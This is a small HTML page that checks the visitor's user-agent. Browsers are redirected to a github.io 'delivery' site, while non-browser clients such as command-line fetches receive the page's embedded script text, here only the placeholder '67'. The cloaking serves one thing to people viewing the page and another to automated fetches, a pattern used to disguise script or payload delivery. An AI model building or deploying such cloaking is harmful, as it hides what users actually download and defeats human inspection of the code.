<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Script</title>
</head>
<body>

<pre id="script"></pre>

<script>
    const script = `67`;

    const ua = navigator.userAgent;

    const isBrowser =
        /Mozilla\/5\.0/i.test(ua) &&
        /Chrome|Chromium|Firefox|Safari|Edg|Opera/i.test(ua);

    if (isBrowser) {
        window.location.replace("https://delivery-2347.github.io/");
    } else {
        document.getElementById("script").textContent = script;
    }
</script>

</body>
</html>
